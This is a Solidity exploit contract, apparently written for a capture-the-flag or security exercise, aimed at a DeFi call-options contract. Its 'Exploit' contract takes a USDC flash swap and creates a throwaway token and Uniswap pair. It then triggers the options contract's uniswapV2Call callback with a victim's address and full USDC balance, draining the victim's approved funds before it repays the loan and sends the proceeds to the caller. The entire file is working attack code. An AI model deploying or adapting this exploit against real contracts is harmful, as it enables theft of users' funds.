// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ICallOptions {
    function optionsData(bytes32) external view returns (uint256, uint256, uint256, uint256);
    function getLatestOptionId() external view returns (bytes32);
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract NBToken is ERC20 {
    constructor() ERC20("NB", "NB") {
        _mint(msg.sender, 10_000e18);
    }
}

contract Exploit {
    IUniswapV2Router02 private uniRouter;
    IUniswapV2Factory private uniFactory;
    ICallOptions private callOptions;
    IUniswapV2Pair private nbPair;
    ERC20 private nbToken;
    IERC20 private usdc;
    address private victim;

    function start(
        address _uniRouter,
        address _uniFactory,
        address _pair,
        address _usdc, 
        address _callOptions,
        address _victim
    ) external {
        uniRouter = IUniswapV2Router02(_uniRouter);
        uniFactory = IUniswapV2Factory(_uniFactory);
        usdc = IERC20(_usdc);
        callOptions = ICallOptions(_callOptions);
        victim = _victim;

        bool t0 = IUniswapV2Pair(_pair).token0() == address(usdc);
        if (t0) {
            IUniswapV2Pair(_pair).swap(3000e18, 0, address(this), new bytes(0x1));
        } else {
            IUniswapV2Pair(_pair).swap(0, 3000e18, address(this), new bytes(0x1));
        }
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }

    function makePair() private {
        nbToken = new NBToken();
        nbToken.approve(address(uniRouter), type(uint256).max);
        usdc.approve(address(uniRouter), type(uint256).max);
        uniRouter.addLiquidity(
            address(usdc),
            address(nbToken),
            usdc.balanceOf(address(this)),
            10e18,
            0,
            0,
            address(this),
            block.timestamp
        );
        nbPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(nbToken)));
        require(address(nbPair) != address(0x0), "N1");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        makePair();
        bytes32 optionId = callOptions.getLatestOptionId();
        (,uint256 usdcStrike,,) = callOptions.optionsData(optionId);
        bool t0 = nbPair.token0() == address(usdc);
        bytes memory data1 = abi.encode(optionId, victim, usdc.balanceOf(victim));
        if (t0) {
            nbPair.swap(usdcStrike, 0, address(callOptions), data1);
        } else {
            nbPair.swap(0, usdcStrike, address(callOptions), data1);
        }
        nbPair.approve(address(uniRouter), type(uint256).max);
        uniRouter.removeLiquidity(
            address(usdc), 
            address(nbToken), 
            nbPair.balanceOf(address(this)), 
            0,
            0,
            address(this),
            block.timestamp
        );
        //repay flashloan
        usdc.transfer(msg.sender, 3010e18);
    }
}
